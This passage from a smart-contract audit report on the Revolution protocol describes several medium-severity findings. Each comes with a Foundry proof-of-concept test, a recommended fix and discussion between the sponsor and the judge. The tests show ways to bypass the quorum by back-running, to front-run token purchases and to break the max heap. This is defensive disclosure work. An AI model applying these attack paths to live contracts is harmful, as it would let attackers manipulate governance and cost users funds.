        // Her piece is the top voted one, but hasn't reached her quorum
        piece = cultureIndex.getTopVotedPiece();
        assertLt(cultureIndex.totalVoteWeights(piece.pieceId), piece.quorumVotes);
        assertEq(piece.pieceId, alicesPiece);

        // Alice's piece cannot be dropped
        vm.startPrank(cultureIndex.dropperAdmin());
        vm.expectRevert();
        cultureIndex.dropTopVotedPiece();

        // At this point Alice's piece will stay top voted,
        // Since Bob and Charlie don't want to vote on her art piece
        // Even if they did, this way an unpopular art piece might be forced into
        // being auctioned off in the AuctionHouse, which will DoS the users of the protocol for even longer
    }

    function createArtPiece(
        string memory name,
        string memory description,
        ICultureIndex.MediaType mediaType,
        string memory image,
        string memory text,
        string memory animationUrl,
        address creatorAddress,
        uint256 creatorBps
    ) internal returns (uint256) {
        ICultureIndex.ArtPieceMetadata memory metadata = ICultureIndex.ArtPieceMetadata({
            name: name,
            description: description,
            mediaType: mediaType,
            image: image,
            text: text,
            animationUrl: animationUrl
        });

        ICultureIndex.CreatorBps[] memory creators = new ICultureIndex.CreatorBps[](1);
        creators[0] = ICultureIndex.CreatorBps({ creator: creatorAddress, bps: creatorBps });

        return cultureIndex.createPiece(metadata, creators);
    }
    
    function createDefaultArtPiece(address creator) public returns (uint256) {
        return
            createArtPiece(
                "Mona Lisa",
                "A masterpiece",
                ICultureIndex.MediaType.IMAGE,
                "ipfs://legends",
                "",
                "",
                creator,
                10000
            );
    }
}
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

There isn't a very elegant way to fix this, as this is how a Max Heap is supposed to function. One way is to add an admin function that can forcefully drop a piece from the Max Heap.

**[rocketman-21 (Revolution) acknowledged and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/449#issuecomment-1877911580):**
 > One potential solution here is to let the DAO vote to axe the vote weight of malicious pieces that attempt to do this.
> 
> In any case, assuming most actors in the community are good, the artists can just garner more votes than the malicious piece to bypass this issue.

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/449#issuecomment-1879736433):**
 > Imho we cannot rely on most community members acting in good faith 100% of the time to prevent this from happening, therefore I am leaning more towards `Medium` severity since the protocol and good faith actors can be negatively impacted by this attack.  
> 
> Furthermore, there is currently no way to easily circumvent this problem.

**[rocketman-21 (Revolution) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/449#issuecomment-1883333360):**
 > Right @0xTheC0der but it assumes malicious vote weight > the remaining vote weight of "good" active users > quorum.
> 
> It assumes these "good users" are unable to vote for a good piece to reach the top voted piece spot.
> 
> imo there could be some severe edge cases where voter apathy paired with a low quorum could make this possible, but with a sufficient active voting base and a solid quorum, I don't think the assumption that a malicious user will always be able to have the largest amount of vote weight vs. everyone else actually holds up in a real world scenario?
> 
> if quorum is low and voter turnout is low that's a different story.

> It's a balancing act - if the quorum is too high this can happen in any case. I think this is fair on second thought in some edge cases, just not sure how to fix.


**[osmanozdemir1 (Warden) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/449#issuecomment-1883981089):**
 > Hi @0xTheC0der 
> Thanks for judging this contest.
> 
> The explained scenario can be produced as PoC but it doesn't realistic for an active protocol with tens/hundreds of users.
> 
> For this to happen:
> 
> 1. Fake art piece must be top voted.
> 2. But it also must not reach the quorum.
> 3. And other pieces must have less votes than the fake one, but also reach to the quorum. 
> 
> Besides,
> 
> > Note that the malicious user that does the attack, doesn’t lose any funds, as he is just paying to buy the voting token
> 
> This implies the attack is not costly but it is incorrect since the voting token is not transferable. The attacker can not sell or swap these tokens. "Just paying to buy voting token" is in fact a huge cost for the token that worths nothing in terms of money. Also it needs to be more than everyone else's total voting power to actually perform this attack. If community can surpass the attacker's fake token's vote count, the attacker must create another fake art piece and must buy additional voting power. 


**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/449#issuecomment-1887684056):**
 > Thanks everyone for their input!
> 
> I agree that the attack path is rather hand-wavy. However, the described problem can also occur naturally without an attacker.  
> See report:
> > This scenario can happen naturally, without anyone being malicious and the attack doesn't rely on the fact that anyone can call buyToken , it just makes it easier.
> 
> See sponsor:
> > It's a balancing act - if the quorum is too high this can happen in any case. I think this is fair on second thought in some edge cases, just not sure how to fix
> 
> As the report also comes with a PoC (even though with an attacker) that proves that the protocol can be brought into this state, maintaining Medium severity seems appropriate.

***

## [[M-04] The quorumVotes can be bypassed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/409)
*Submitted by [ast3ros](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/409), also found by [Pechenite](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/677), [dimulski](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/667), [peanuts](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/485), [KupiaSec](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/467), [cccz](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/452), [mojito\_auditor](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/445), [deth](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/434), [0xG0P1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/380), [zhaojie](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/370), [osmanozdemir1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/140), and [rvierdiiev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/17)*

This vulnerability allows for the minting and auctioning of an art piece that has not met the required quorum. It enables malicious voters to influence outcomes with fewer votes than what is stipulated by the protocol. This undermines a key invariant of the protocol:

        An art piece that has not met quorum cannot be dropped.

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/08ff070da420e95d7c7ddf9d068cbf54433101c4/README.md?plain=1#L291>

### Proof of Concept

The `quorumVotes` for an art piece are calculated at its creation as a fraction of the `totalVotesSupply`, which depends on the total supply of `erc20VotingToken` and `erc721VotingToken`:

        (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000.

```javascript
File: src/CultureIndex.sol
209:     function createPiece(
210:         ArtPieceMetadata calldata metadata,
211:         CreatorBps[] calldata creatorArray
212:     ) public returns (uint256) {
213:         uint256 creatorArrayLength = validateCreatorsArray(creatorArray);
214: 
215:         // Validate the media type and associated data
216:         validateMediaType(metadata);
217: 
218:         uint256 pieceId = _currentPieceId++;
219: 
220:         /// @dev Insert the new piece into the max heap
221:         maxHeap.insert(pieceId, 0);
222: 
223:         ArtPiece storage newPiece = pieces[pieceId];
224: 
225:         newPiece.pieceId = pieceId;
226:         newPiece.totalVotesSupply = _calculateVoteWeight(
227:             erc20VotingToken.totalSupply(),
228:             erc721VotingToken.totalSupply()
229:         );
230:         newPiece.totalERC20Supply = erc20VotingToken.totalSupply();
231:         newPiece.metadata = metadata;
232:         newPiece.sponsor = msg.sender;
233:         newPiece.creationBlock = block.number;
234:         newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000;
```

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/08ff070da420e95d7c7ddf9d068cbf54433101c4/packages/revolution/src/CultureIndex.sol#L209-L234>

The `totalVotesSupply` is calculated using total supply of `erc20VotingToken` and `erc721VotingToken` at the time the piece is created. It intends to calculate all the voting power that can vote for this art piece.

```javascript
File: src/CultureIndex.sol
284:     function _calculateVoteWeight(uint256 erc20Balance, uint256 erc721Balance) internal view returns (uint256) {
285:         return erc20Balance + (erc721Balance * erc721VotingTokenWeight * 1e18);
286:     }
```

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/08ff070da420e95d7c7ddf9d068cbf54433101c4/packages/revolution/src/CultureIndex.sol#L284-L286>

The vulnerability arises because the `totalVotesSupply` is computed based on the token supplies at the time of art piece creation. However, due to the block-based clock mode in the vote checkpoint, the total supplies of `erc20VotingToken` and `erc721VotingToken` can increase within the same block, resulting in an underestimation of `totalVotesSupply` and consequently, `quorumVotes`.

```javascript
File: src/base/VotesUpgradeable.sol
85:     /**
86:      * @dev Clock used for flagging checkpoints. Can be overridden to implement timestamp based
87:      * checkpoints (and voting), in which case {CLOCK_MODE} should be overridden as well to match.
88:      */
89:     function clock() public view virtual returns (uint48) {
90:         return Time.blockNumber();
91:     }
```

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/08ff070da420e95d7c7ddf9d068cbf54433101c4/packages/revolution/src/base/VotesUpgradeable.sol#L85-L91>

Possible attack scenarios include:

*   A voter back-running the createPiece transaction and purchasing governance tokens in the same block, thereby artificially lowering the quorumVotes.
*   A creator front-running a significant token purchase or auction settlement, leading to a similar underestimation of quorumVotes.

POC: This POC demonstrates the first case when a voter back-run the `createPiece` transaction to understate the `totalVotesSupply` and `quorumVotes`.

*   Navigate to : `cd packages/revolution`
*   Create a test file `test/BypassQuorum.t.sol`
*   Execute `forge test -vvvvv --match-path test/BypassQuorum.t.sol --match-test testBypassquorumVotes`

<details>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import { Test } from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import { AuctionHouseTest } from "./auction/AuctionHouse.t.sol";
import { IERC20TokenEmitter } from "../../src/interfaces/IERC20TokenEmitter.sol";

contract POCTest is AuctionHouseTest {

    function testBypassquorumVotes() public {

        uint256 verbId0 = createDefaultArtPiece();

        (,,,,uint256 creationBlock ,uint256 quorumVotes,,uint256 totalVotesSupply)= cultureIndex.pieces(0);
        console.log("creationBlock: ", creationBlock); // creationBlock:  1
        console.log("quorumVotes: ", quorumVotes); // quorumVotes:  0
        console.log("totalVotesSupply: ", totalVotesSupply); // totalVotesSupply:  0

        // Voter back-run the createPiece transaction and buy vote tokens in the same block, the supply is not reflected in the piece info and the quorum is understated at 0
        uint256 buyAmount = 100 ether;
        vm.deal(address(21), buyAmount);

        address[] memory recipients = new address[](1);
        recipients[0] = address(1);

        uint256[] memory bps = new uint256[](1);
        bps[0] = 10_000;
        vm.stopPrank();

        vm.prank(address(21));
        erc20TokenEmitter.buyToken{ value: buyAmount }(
            recipients,
            bps,
            IERC20TokenEmitter.ProtocolRewardAddresses({
                builder: address(0),
                purchaseReferral: address(0),
                deployer: address(0)
            })
        );

        console.log("Should be quorum: ", cultureIndex.quorumVotes()); // Should be quorum:  1940052234587701020

    }
}

```
</details>

### Recommended Mitigation Steps

When the piece is created, only store the `creationBlock`. The quorum should not be stored. It should be calculated directly using `VotesUpgradeable.getPastTotalSupply`, this will return the value at the end of the corresponding block.

It ensures that `quorumVotes` accurately reflects the voting power at the end of the block in which the art piece was created, thereby mitigating the risk of quorum bypass through token supply manipulation within the same block.

```diff
    function dropTopVotedPiece() public nonReentrant returns (ArtPiece memory) {
        require(msg.sender == dropperAdmin, "Only dropper can drop pieces");

        ICultureIndex.ArtPiece memory piece = getTopVotedPiece();
-       require(totalVoteWeights[piece.pieceId] >= piece.quorumVotes, "Does not meet quorum votes to be dropped.");
+       uint256 totalVotesSupply = _calculateVoteWeight(
+               erc20VotingToken.getPastTotalSupply(piece.creationBlock),
+               erc721VotingToken.getPastTotalSupply(piece.creationBlock)
+            );
+       uint256 quorumVotes = (quorumVotesBPS * totalVotesSupply) / 10_000;
+       require(totalVoteWeights[piece.pieceId] >= quorumVotes, "Does not meet quorum votes to be dropped.");
```


**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/409#issuecomment-1877907571)**

***

## [[M-05] Since buyToken function has no slippage checking, users can get less tokens than expected when they buy tokens directly](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/397)
*Submitted by [deepplus](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/397), also found by [Aymen0909](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/650), [adeolu](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/547), [passteque](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/475), [jnforja](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/469), [KupiaSec](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/455), [Tricko](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/448), [wangxx2026](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/401), [zhaojie](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/372), [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/346), [SadeeqXmosh](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/245), [DanielArmstrong](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/238), [SpicyMeatball](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/150), [0xmystery](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/91), [Inference](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/82), and [rvierdiiev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/26)*

Users can buy NontransferableERC20Token by calling `buyToken` function directly. At that time, the expected amount of tokens they will receive is determined based on current supply and their paying ether amount. But, due to some transactions(such as settleAuction or another user's buyToken) which is running in front of caller's transaction, they can get less token than they expected.

### Proof of Concept

The VRGDAC always exponentially increase the price of tokens if the supply is ahead of schedule. Therefore, if another transaction of buying token is frontrun against a user's buying token transaction, the token price can arise than expected.

For instance, let's assume that ERC20TokenEmitter is initialized with following params:

*   target price: 1 ether
*   decay percent: 10 %
*   per time unit: 10 ether

To avoid complexity, we will assume that the supply of token so far is consistent with the schedule. When alice tries to buy token with `5 ether`, expected amount is calculated by `getTokenQuoteForEther(5 ether)` and the value is about `4.87 ether`.
However, if Bob's transaction to buy tokens with `10 ether` is executed before Alice, the real amount which Alice will receive is about `4.43 ether`.

You can check result through following test:

<details>

```solidity
    function testBuyTokenWithoutSlippageCheck() public {
        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");

        vm.deal(address(alice), 100000 ether);
        vm.deal(address(bob), 100000 ether);

        address[] memory recipients = new address[](1);
        recipients[0] = address(1);
        uint256[] memory bps = new uint256[](1);
        bps[0] = 10_000;

        // expected amount of minting token when alice calls buyToken
        int256 expectedAmount = erc20TokenEmitter.getTokenQuoteForEther(5 ether);

        vm.startPrank(bob);
        // assume that bob calls buy token with 10 ether
        erc20TokenEmitter.buyToken{ value: 10 ether }(
            recipients,
            bps,
            IERC20TokenEmitter.ProtocolRewardAddresses({
                builder: address(0),
                purchaseReferral: address(0),
                deployer: address(0)
            })
        );

        vm.stopPrank();

        vm.startPrank(alice);
        // calculate the amount of tokens which alice will actually receive
        int256 realAmount = erc20TokenEmitter.getTokenQuoteForEther(5 ether);

        vm.stopPrank();

        emit log_string("Expected Amount: ");
        emit log_int(expectedAmount);
        emit log_string("Real Amount: ");
        emit log_int(realAmount);

        assertLt(realAmount, expectedAmount, "Alice should receive less than expected if Bob frontrun buyToken");
    }
```
</details>

Therefore, Alice will get about `0.44 ether` less tokens than expected since there is no any checking of slippage in `buyToken` function.

### Tools Used

VS Code

### Recommended Mitigation Steps

Add slippage checking to `buyToken` function. This slippage checking should be executed only when the user calls `buyToken` function directly. In other words, it should not be executed when settleAuction calls `buyToken` function.

**[rocketman-21 (Revolution) acknowledged and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/397#issuecomment-1877897204):**
 > This is intended and a consequence of how the VRGDA functions, when people buy tokens the price goes up if it is ahead of schedule.
> 
> Not ideal UX, but not going to fix for now.

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/397#issuecomment-1879745507):**
 > Even though the increasing price is intended, it's state of the art to introduce a slippage parameter to protect users from receiving less than expected. Therefore, maintaining `Medium` severity seems appropriate.

***

## [[M-06] ERC20TokenEmitter will not work after a certain period of time](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/371)
*Submitted by [zhaojie](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/371), also found by [jerseyjoewalcott](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/357)*

The `timeSinceStart` in the `vrgdac.xToY` function will revert over a certain value, resulting in the `ERC20TokenEmitter#buyToken` function always revert.

### Proof of Concept

Initialize the VRGDAC using the parameters in the test code.

```solidity
    VRGDAC vrgdac = new VRGDAC(1 ether, 1e18 / 10, 1_000 * 1e18);
```

The `timeSinceStart` is set to 394 days in the test code:

```solidity
    function testVRGDAC_time() public {
        VRGDAC vrgdac = new VRGDAC(1 ether, 1e18 / 10, 1_000 * 1e18);
        int256 x = vrgdac.yToX({
            timeSinceStart: toDaysWadUnsafe(86400 * 400),
            sold: 1000 ether,
            amount: 1 ether
        });
        uint256 xx = uint256(x);
        console.log(xx + 1);
        console.log(xx / 1e18);
    }
```

Run the `forge test -vvvv`, console to output:

    [FAIL. Reason: UNDEFINED] testVRGDAC_time() (gas: 554525)
    Traces:
      [106719] CounterTest::setUp() 
        ├─ [49499] → new Counter@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
        │   └─ ← 247 bytes of code
        ├─ [2390] Counter::setNumber(0) 
        │   └─ ← ()
        └─ ← ()

      [554525] CounterTest::testVRGDAC_time() 
        ├─ [517512] → new VRGDAC@0x2e234DAe75C793f67A35089C9d99245E1C58470b
        │   └─ ← 2578 bytes of code
        ├─ [3617] VRGDAC::yToX(400000000000000000000, 1000000000000000000000, 1000000000000000000) [staticcall]
        │   └─ ← "UNDEFINED"
        └─ ← "UNDEFINED"

Changing the `timeSinceStart` to `toDaysWadUnsafe(86400 * 365)` will work.

When this function is used in `ERC20TokenEmitter#buyToken`, the `timeSinceStart` is: block.timestamp-startTime

```solidity
    function buyTokenQuote(uint256 amount) public view returns (int spentY) {
        require(amount > 0, "Amount must be greater than 0");
        return
            vrgdac.xToY({
                timeSinceStart: toDaysWadUnsafe(block.timestamp - startTime),
                sold: emittedTokenWad,
                amount: int(amount)
            });
    }
```

`startTime` is set during the initialization of the `ERC20TokenEmitter` contract:

```solidity
    function initialize(
        address _initialOwner,
        address _erc20Token,
        address _treasury,
        address _vrgdac,
        address _creatorsAddress
    ) external initializer {
        .....
        startTime = block.timestamp;
    }
```

In other words, if the `ERC20TokenEmitter` contract is deployed and initialized and becomes unavailable after 400 days(400 days is the test value, the actual value will be affected by other parameters), calling the `buyToken` function will always revert.

### Tools Used

VScode

### Recommended Mitigation Steps

Optimize the vrgdac.yToX function, or set a minimum `timeSinceStart` value, which is used when the minimum is exceeded.


**[rocketman-21 (Revolution) confirmed and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/371#issuecomment-1879829320):**
 > Looked into this extensively, it operates under the assumption that the token emission schedule (# sold) will be way off schedule. eg: over a year, 75%+ lower than expected according to the target sale per time unit.
> 
> In that case, after a prolonged amount of time, the math in the VRGDA will break due to a param reaching 0 in the available fixed point decimals. given the VRGDA pricing mechanism decreases the price, my assumption is that in a rational market we will never reach the above case, because tokens will become cheaper and cheaper. or the DAO/community will be dead and no one wants to buy tokens anymore.

> However, upon second look here - I do think this is valid.
> 
> I was able to reproduce the VRGDA breaking in multiple different scenarios due to precision loss in the VRGDA math
> 
> even if the supply was way off schedule, there could be scenarios imho where the community sets a large perTimeUnit and targetPrice and never meets that volume, and after 1+ years their vrgda will likely break
> 
> fix here:
> https://github.com/collectivexyz/revolution-protocol/commit/2bd0b35df870097be166a0d57af0a1f0d62a7518


**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/371#issuecomment-1881981287):**
 > @rocketman-21 
> Thanks for this insight, as far as I can reproduce the PoCs it's hard to distinguish if this can have an impact on the protocol or just arises under unrealistic assumptions.  

> Nevertheless, it seems like there could be realistic scenarios where this is a problem.

***

## [[M-07] positionMapping for last element in heap is not updated when extracting max element](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363)
*Submitted by [MrPotatoMagic](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363), also found by [cccz](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/473)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L156> <br><https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L94>

During the extraction of the max element through the function [extractMax()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L156), the `positionMapping` for the last element in the heap tree is not updated when the last element is equal to its parent.

These are the following impacts:

1.  MaxHeap does not function as intended and breaks its expected functionality due to element being incorrectly indexed in the heap.
2.  When a new element is inserted to that index, the incorrectly indexed element accesses the new element's itemId during value updates
3.  Downward heapifying will work incorrectly leading to the parent having a value smaller than its child. Thus, further breaking not only the maxHeap tree but also the binary tree spec.
4.  Error in this heapifying will lead to the incorrectly indexed element being extracted.

**Note: Point 3 in the impacts above breaks an invariant of the MaxHeap tree mentioned in the README.**

```solidity
The MaxHeap should always maintain the property of being a binary tree in which the value in each internal node is greater than or equal to the values in the children of that node. 
```

### Proof of Concept

Here is the whole process:

1.  Let's assume this is the current state of the maxHeap tree.

*   The values have been made small for ease of demonstration of the issue
*   The itemIds being used are 1,2,3,4,5 with values being 50,20,15,10,20 respectively.
*   The current indexes of the items are 0,1,2,3,4 (since size starts from 0)
*   The current size of the tree is 5.
*   Over here, note that **itemId 2 is the parent of itemId 5 and both have the same values 20**.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363).*

2.  Now let's say the top element with itemId = 1 and value = 50 is extracted using the [extractMax()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L156) function. The following occurs:

*   On Line 174, we store the itemId at the root into the variable popped
*   On Line 175, we replace the itemId at the root (effectively erasing it) with the last element in the heap tree i.e. itemId 5.
*   On Line 175, size is decremented from 5 to 4 as expected.
*   Following this on Line 178, we maxHeapify the current element at the root i.e. itemId 5 which was just set on Line 174.

```solidity
File: MaxHeap.sol
171:     function extractMax() external onlyAdmin returns (uint256, uint256) {
172:         require(size > 0, "Heap is empty"); 
173: 
174:         uint256 popped = heap[0]; 
175:         heap[0] = heap[--size]; 
176:         
177:         
178:         maxHeapify(0); 
179: 
180:         return (popped, valueMapping[popped]); 
181:     }
```

3.  During the [maxHeapify()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L94) internal function call, the following occurs:

*   On Lines 100-101, left and right are the indexes 1 and 2 (since pos = 0)
*   On Lines 103-105, the values of the respective itemIds 5,2,3 are extracted as 20,20,15 respectively.
*   On Line 107, we pass the check since 0 is not >= 2 (since size/2 = 4/2 = 2)
*   On Line 109, we do not enter the if block since in the tree now, itemId 5 at the root has value 20 which is neither less than itemId 2 with value 20 nor itemId 3 with value 15. Thus, the function returns back to extractMax() and the call ends.

```solidity
File: MaxHeap.sol
099:     function maxHeapify(uint256 pos) internal {
100:         uint256 left = 2 * pos + 1; 
101:         uint256 right = 2 * pos + 2; 
102: 
103:         uint256 posValue = valueMapping[heap[pos]];
104:         uint256 leftValue = valueMapping[heap[left]];
105:         uint256 rightValue = valueMapping[heap[right]];
106: 
107:         if (pos >= (size / 2) && pos <= size) return; 
108:
109:         if (posValue < leftValue || posValue < rightValue) {
110:
111:             if (leftValue > rightValue) { 
112:                 swap(pos, left);
113:                 maxHeapify(left);
114:             } else {
115:                 swap(pos, right);
116:                 maxHeapify(right);
117:             }
118:         }
119:     }
```

4.  On observing the new state of the tree, we can see the following:

*   ItemId 5 with value 20 has been temporarily removed from index 4 in the tree until a new item is inserted.
*   ItemId 5 with value 20 is now the root of the tree.
*   If we look at the details of the root node, we can see that although the heap and valueMapping mappings have been updated correctly, **the positionMapping still points to index 4 for itemId 5**.
*   This issue originates because during the [maxHeapify()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L94) call, the itemId 5 is not less than either of it's child nodes as the condition in [maxHeapify()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L94) demands on Line 109 above.
*   This is the first impact on the maxHeap data structure since it does not index as expected.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363).*


5.  Now let's say an itemId 6 with a value of 3 is created using the [insert()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L119) function. The following occurs:

*   On Lines 131-133, heap\[4] is updated to itemId 6, valueMapping\[itemId] to 3 and positionMapping\[itemId] to 4.

```solidity
File: MaxHeap.sol
130:     function insert(uint256 itemId, uint256 value) public onlyAdmin {
131:         heap[size] = itemId;
132:         valueMapping[itemId] = value; // Update the value mapping
133:         positionMapping[itemId] = size; // Update the position mapping
134: 
135:         uint256 current = size; 
136:         while (current != 0 && valueMapping[heap[current]] > valueMapping[heap[parent(current)]]) {
137:             swap(current, parent(current));
138:             current = parent(current);
139:         }
140:         size++; 
141:     }
```

6.  If we look at the new state of the tree now, we can observe that both the itemId 5 at the root node and the latest itemId 6 share the same indexes in the tree i.e. positionMapping for both being 4.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/363).*


7.  Now if we call the [updateValue()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L136) function to update value for itemId 5 i.e. the root node, the following occurs:

*   On Line 151, positionMapping\[5] returns 4 as the position of the root itemId 5, which is clearly incorrect as demonstrated in point 6 above.
*   On Line 152, oldValue stores the value of itemId 5 which is 20.
*   Line 155 updates the valueMapping with the newValue.
*   On Line 158, the check determines if the newValue is greater than the oldValue. Let's divide this into two cases, one for upward heapify and one for downward heapify.

```solidity
File: MaxHeap.sol
150:     function updateValue(uint256 itemId, uint256 newValue) public onlyAdmin {
151:         uint256 position = positionMapping[itemId];
152:         uint256 oldValue = valueMapping[itemId];
153: 
154:         // Update the value in the valueMapping
155:         valueMapping[itemId] = newValue;
156: 
157:         // Decide whether to perform upwards or downwards heapify
158:         if (newValue > oldValue) {
159:             // Upwards heapify
160:             while (position != 0 && valueMapping[heap[position]] > valueMapping[heap[parent(position)]]) {
161:                 swap(position, parent(position));
162:                 position = parent(position);
163:             }
164:         } else if (newValue < oldValue) maxHeapify(position); // Downwards heapify 
165:     }
```

8.  If we upward heapify by setting the newValue to be greater than the oldValue 20, the following occurs:

*   On Line 160, the condition evaluates to false. Although expected since the root node is updated, the evaluation occurs incorrectly.
*   The first condition checks if 4 != 0, which is true. This condition should actually have evaluated to false since the root node should have position/index = 0
*   The second condition evaluates to false. This is because the valueMapping is accessing the value for itemId 6 and comparing it to its parent itemId 2.
*   Due to this, although we do not enter the if block, the evaluation occurs incorrectly.

```solidity
File: MaxHeap.sol
159:             // Upwards heapify
160:             while (position != 0 && valueMapping[heap[position]] > valueMapping[heap[parent(position)]]) {
161:                 swap(position, parent(position));
162:                 position = parent(position);
163:             }
```

9.  If we downward heapify by setting the newValue (let's say 13) to be lesser than the oldValue 20, the following occurs:

*   On Line 164, we enter the else if block and make an internal call to [maxHeapify()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L94) with position = 4 as argument instead of 0, which is incorrect.
*   On Lines 101-102, left and right are set to indexes 9 and 10. This is incorrect and should have been 1 and 2 (children of the root node we are updating) instead of itemId 6's children.
*   On Lines 103-105, itemId 6's values are retrieved i.e. 3, 0, 0 respectively.
*   on Line 107, the condition evaluates to true since 4 >= 2 (i.e. size/2 = 5/2) and 4 <= 5 evaluate to true. Due to this we return early and the downward heapify does not occur.
*   The impact here is that itemId 5 in the root now has a value of 13, which is **smaller than it's child node's values** i.e. 20 and 15 respectively. This not only breaks the max heap tree but also the binary tree's spec.
*   Now if [extractMax()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L156) is called, the root node itemId 5 with value 13 is popped instead of the expected itemId 2, which has a value of 20 and is the highest valued element.

```solidity
File: MaxHeap.sol
164:         } else if (newValue < oldValue) maxHeapify(position); // Downwards heapify 
```

[maxHeapify()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L94) function:

```solidity
File: MaxHeap.sol
099:     function maxHeapify(uint256 pos) internal {
100:         uint256 left = 2 * pos + 1; 
101:         uint256 right = 2 * pos + 2; 
102: 
103:         uint256 posValue = valueMapping[heap[pos]];
104:         uint256 leftValue = valueMapping[heap[left]];
105:         uint256 rightValue = valueMapping[heap[right]];
106: 
107:         if (pos >= (size / 2) && pos <= size) return; 
108:
109:         if (posValue < leftValue || posValue < rightValue) {
110:
111:             if (leftValue > rightValue) { 
112:                 swap(pos, left);
113:                 maxHeapify(left);
114:             } else {
115:                 swap(pos, right);
116:                 maxHeapify(right);
117:             }
118:         }
119:     }
```

10. Here is how the max heap binary tree looks finally.

